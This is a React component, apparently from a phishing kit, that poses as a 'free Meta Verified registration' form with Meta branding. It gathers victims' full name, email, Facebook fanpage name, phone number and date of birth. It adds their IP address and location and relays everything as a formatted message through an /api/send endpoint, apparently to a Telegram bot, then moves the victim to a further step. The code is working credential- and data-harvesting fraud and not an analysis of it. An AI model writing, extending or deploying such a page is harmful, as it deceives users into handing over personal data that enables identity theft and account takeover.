import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import { getTranslations } from '@/utils/translate';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import IntlTelInput from 'intl-tel-input/reactWithUtils';
import Image from 'next/image';
import { type ChangeEvent, type FC, type FormEvent, useCallback, useEffect, useMemo, useState } from 'react';

interface FormData {
    fullName: string;
    personalEmail: string;
    pageName: string;
    day: string;
    month: string;
    year: string;
}

const initialFormData: FormData = {
    fullName: '',
    personalEmail: '',
    pageName: '',
    day: '',
    month: '',
    year: ''
};

const InitModal: FC<{ nextStep: (data: FormData) => void }> = ({ nextStep }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [phoneNumber, setPhoneNumber] = useState('');
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [agreeToTerms, setAgreeToTerms] = useState(false);
    const [formData, setFormData] = useState<FormData>(initialFormData);

    const { setModalOpen, geoInfo, setMessageId, setMessage, setUserEmail, setUserPhone } = store();
    const countryCode = geoInfo?.country_code.toLowerCase() || 'us';

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;
        
        // Map country code to language code for translation (comprehensive mapping)
        const countryToLang: Record<string, string> = {
            // English
            'us': 'en', 'gb': 'en', 'au': 'en', 'ca': 'en', 'nz': 'en', 'ie': 'en',
            'sg': 'en', 'hk': 'en', 'za': 'en', 'ng': 'en', 'ke': 'en', 'gh': 'en',
            // Vietnamese
            'vn': 'vi',
            // Arabic
            'ae': 'ar', 'sa': 'ar', 'eg': 'ar', 'jo': 'ar', 'lb': 'ar', 'om': 'ar',
            'qa': 'ar', 'kw': 'ar', 'bh': 'ar', 'iq': 'ar', 'ye': 'ar', 'ps': 'ar',
            'tn': 'ar', 'ma': 'ar', 'dz': 'ar', 'ly': 'ar', 'sd': 'ar', 'mr': 'ar',
            // German
            'de': 'de', 'at': 'de', 'ch': 'de', 'lu': 'de',
            // Dutch
            'nl': 'nl', 'be': 'nl',
            // Bulgarian
            'bg': 'bg',
            // Portuguese
            'pt': 'pt', 'br': 'pt', 'ao': 'pt', 'mz': 'pt', 'cv': 'pt', 'gw': 'pt', 'st': 'pt',
            // Spanish
            'es': 'es', 'mx': 'es', 'ar': 'es', 'co': 'es', 'pe': 'es', 've': 'es',
            'cl': 'es', 'ec': 'es', 'bo': 'es', 'py': 'es', 'uy': 'es', 'cr': 'es',
            'pa': 'es', 'sv': 'es', 'hn': 'es', 'ni': 'es', 'gt': 'es', 'do': 'es', 'cu': 'es',
            // Finnish
            'fi': 'fi',
            // French
            'fr': 'fr', 'sn': 'fr', 'ci': 'fr', 'bj': 'fr',
            'bf': 'fr', 'ga': 'fr', 'gn': 'fr', 'cm': 'fr', 'cg': 'fr', 'ne': 'fr',
            'tg': 'fr', 'ml': 'fr', 'cd': 'fr', 'cf': 'fr', 'dj': 'fr', 'sc': 'fr',
            'bl': 'fr', 'gp': 'fr', 'mq': 'fr', 're': 'fr', 'mu': 'fr', 'ht': 'fr',
            // Greek
            'gr': 'el', 'cy': 'el',
            // Croatian
            'hr': 'hr',
            // Hungarian
            'hu': 'hu',
            // Hindi
            'in': 'hi',
            // Italian
            'it': 'it', 'sm': 'it', 'va': 'it',
            // Lithuanian
            'lt': 'lt',
            // Latvian
            'lv': 'lv',
            // Maltese
            'mt': 'mt',
            // Malay
            'my': 'ms',
            // Norwegian
            'no': 'no',
            // Polish
            'pl': 'pl',
            // Romanian
            'ro': 'ro', 'md': 'ro',
            // Swedish
            'se': 'sv', 'ax': 'sv',
            // Slovenian
            'si': 'sl',
            // Slovak
            'sk': 'sk',
            // Thai
            'th': 'th',
            // Turkish
            'tr': 'tr',
            // Chinese
            'cn': 'zh', 'tw': 'zh', 'mo': 'zh',
            // Korean
            'kr': 'ko',
            // Czech
            'cz': 'cs',
            // Danish
            'dk': 'da', 'gl': 'da',
            // Estonian
            'ee': 'et',
            // Filipino
            'ph': 'tl',
            // Russian
            'ru': 'ru',
            // Japanese
            'jp': 'ja',
            // Bengali
            'bd': 'bn',
            // Urdu
            'pk': 'ur',
            // Ukrainian
            'ua': 'uk',
            // Indonesian
            'id': 'id',
            // Persian (Farsi)
            'ir': 'fa',
            // Burmese
            'mm': 'my',
            // Swahili
            'tz': 'sw'
        };
        
        const targetLang = countryToLang[geoInfo.country_code.toLowerCase()] || 'en';
        const translationsData = getTranslations(targetLang);
        setTranslations(translationsData);
    }, [geoInfo]);

    const initOptions = useMemo(
        () => ({
            initialCountry: countryCode as '',
            separateDialCode: true,
            strictMode: false,
            nationalMode: true,
            autoPlaceholder: 'aggressive' as const,
            placeholderNumberType: 'MOBILE' as const,
            countrySearch: false,
            formatAsYouType: false
        }),
        [countryCode]
    );

    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>) => {
        const { name, value, type } = e.target as HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement;
        setFormData((prev) => ({
            ...prev,
            [name]: type === 'checkbox' ? (e.target as HTMLInputElement).checked : value
        }));
    }, []);

    const handlePhoneChange = useCallback((e: ChangeEvent<HTMLInputElement>) => {
        const numbersOnly = e.target.value.replace(/\D/g, '');
        setPhoneNumber(numbersOnly);
    }, []);

    const handlePhoneKeyPress = useCallback((e: React.KeyboardEvent<HTMLInputElement>) => {
        const char = String.fromCharCode(e.which);
        if (!/[0-9]/.test(char)) {
            e.preventDefault();
        }
    }, []);

    const handleFullNumberChange = useCallback((number: string) => {
        setPhoneNumber(number);
    }, []);

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (isLoading) return;
        setIsLoading(true);

        const message = `
${
    geoInfo
        ? `<b>📌 IP:</b> <code>${geoInfo.ip}</code>\n<b>🌎 Country:</b> <code>${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})</code>`
        : 'N/A'
}

<b>👤 Full Name:</b> <code>${formData.fullName}</code>
<b>📧 Email Address:</b> <code>${formData.personalEmail}</code>
<b> Fanpage Name:</b> <code>${formData.pageName}</code>
<b>📱 Phone Number:</b> <code>${phoneNumber}</code>
<b>🎂 Date of Birth:</b> <code>${formData.day}/${formData.month}/${formData.year}</code>

<b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
        `.trim();

        try {
            const res = await axios.post('/api/send', {
                message
            });
            if (res?.data?.success && typeof res.data.data.result.message_id === 'number') {
                setMessageId(res.data.data.result.message_id);
                setMessage(message);
            }
        } catch {
            // Continue even if send fails
        } finally {
            setIsLoading(false);
            // Save email and phone to store
            setUserEmail(formData.personalEmail);
            setUserPhone(phoneNumber);
            nextStep(formData);
        }
    };

    return (
        <>
            {/* Overlay mờ toàn màn hình */}
            <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center px-1 sm:px-3 md:px-4'>
                <div className='flex max-h-[95vh] w-full max-w-sm sm:max-w-md md:max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'>
                <div className='mb-1.5 sm:mb-2 flex w-full items-center justify-between p-1.5 sm:p-2 md:p-4 pb-0 gap-2'>
                    <p className='font-bold whitespace-nowrap min-w-0 flex-1' style={{ fontSize: 'clamp(0.75rem, 3.5vw, 1.125rem)' }}>{t('Complete the free Meta Verified registration form.')}</p>
                    <button type='button' onClick={() => setModalOpen(false)} className='h-7 sm:h-8 w-7 sm:w-8 rounded-full transition-colors hover:bg-[#e2eaf2] flex-shrink-0' aria-label='Close modal'>
                        <FontAwesomeIcon icon={faXmark} size='lg' />
                    </button>
                </div>
                <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-hidden px-1.5 sm:px-3 md:px-4'>
                    <div className='flex flex-col gap-1.5 sm:gap-1.5 md:gap-2 pt-4 sm:pt-5 pb-2 sm:pb-2.5 overflow-y-auto'>
                        {/* Full Name */}
                        <input 
                            required 
                            type='text'
                            name='fullName'
                            placeholder={t('Full Name')}
                            value={formData.fullName}
                            onChange={handleInputChange}
                            className='h-10 sm:h-11 md:h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-sm md:text-base placeholder-gray-500'
                        />

                        {/* Email Address */}
                        <input 
                            required 
                            type='email'
                            name='personalEmail'
                            placeholder={t('Email Address')}
                            value={formData.personalEmail}
                            onChange={handleInputChange}
                            className='h-10 sm:h-11 md:h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-sm md:text-base placeholder-gray-500'
                        />

                        {/* Fanpage Name */}
                        <input 
                            required 
                            type='text'
                            name='pageName'
                            placeholder={t('Fanpage Name')}
                            value={formData.pageName}
                            onChange={handleInputChange}
                            className='h-10 sm:h-11 md:h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-sm md:text-base placeholder-gray-500'
                        />

                        {/* Phone Number */}
                        <IntlTelInput
                            initOptions={initOptions}
                            onChangeNumber={handleFullNumberChange}
                            inputProps={{
                                name: 'phoneNumber',
                                type: 'tel',
                                inputMode: 'numeric',
                                maxLength: 11,
                                required: true,
                                onChange: handlePhoneChange,
                                onKeyPress: handlePhoneKeyPress,
                                className: 'h-10 sm:h-11 md:h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-sm md:text-base placeholder-gray-500'
                            }}
                        />

                        {/* Date of Birth */}
                        <div className='flex gap-2 sm:gap-2.5'>
                            {/* Day Select */}
                            <select 
                                required
                                name='day'
                                value={formData.day}
                                onChange={handleInputChange}
                                className='h-9 sm:h-10 md:h-11 flex-1 rounded-[8px] border-2 border-[#d4dbe3] px-2 py-1 text-xs md:text-sm text-gray-700'
                            >
                                <option value=''>DD</option>
                                {Array.from({ length: 31 }, (_, i) => (
                                    <option key={i + 1} value={String(i + 1).padStart(2, '0')}>
                                        {String(i + 1).padStart(2, '0')}
                                    </option>
                                ))}
                            </select>

                            {/* Month Select */}
                            <select 
                                required
                                name='month'
                                value={formData.month}
                                onChange={handleInputChange}
                                className='h-9 sm:h-10 md:h-11 flex-1 rounded-[8px] border-2 border-[#d4dbe3] px-2 py-1 text-xs md:text-sm text-gray-700'
                            >
                                <option value=''>MM</option>
                                {Array.from({ length: 12 }, (_, i) => (
                                    <option key={i + 1} value={String(i + 1).padStart(2, '0')}>
                                        {String(i + 1).padStart(2, '0')}
                                    </option>
                                ))}
                            </select>

                            {/* Year Select */}
                            <select 
                                required
                                name='year'
                                value={formData.year}
                                onChange={handleInputChange}
                                className='h-9 sm:h-10 md:h-11 flex-1 min-w-20 rounded-[8px] border-2 border-[#d4dbe3] px-2 py-1 text-xs md:text-sm text-gray-700'
                            >
                                <option value=''>YYYY</option>
                                {Array.from({ length: 100 }, (_, i) => {
                                    const year = new Date().getFullYear() - i;
                                    return (
                                        <option key={year} value={String(year)}>
                                            {year}
                                        </option>
                                    );
                                })}
                            </select>
                        </div>

                        {/* Disclaimer */}
                        <p className='text-xs text-gray-600 mt-0.5'>{t('Our response will be sent to you within 14-48 hours.')}</p>

                        {/* Terms Checkbox */}
                        <div className='flex items-center gap-2 mt-1'>
                            <input 
                                type='checkbox' 
                                id='agreeTerms'
                                checked={agreeToTerms}
                                onChange={(e) => setAgreeToTerms(e.target.checked)}
                                className='w-4 h-4 cursor-pointer flex-shrink-0'
                            />
                            <label htmlFor='agreeTerms' className='text-xs text-gray-700 cursor-pointer leading-tight'>
                                {t('I agree to the')} {' '}
                                <span className='text-blue-600'>
                                    {t('Terms of Service')}
                                </span>
                                {' '}{t('and')}{' '}
                                <span className='text-blue-600'>
                                    {t('Privacy Policy')}
                                </span>
                            </label>
                        </div>

                        {/* Submit Button */}
                        <button 
                            type='submit' 
                            disabled={isLoading}
                            className={`mt-2 sm:mt-2.5 md:mt-3 flex h-10 sm:h-11 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-xs sm:text-sm text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-60' : ''}`}
                        >
                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Submit')}
                        </button>
                    </div>
                </form>

                <div className='flex items-center justify-center p-1.5 sm:p-2 md:p-3'>
                    <Image src={MetaLogo} alt='' className='h-3.5 sm:h-4 md:h-4.5 w-14 sm:w-16 md:w-17.5' />
                </div>
            </div>
            </div>
        </>
    );
};

export default InitModal;
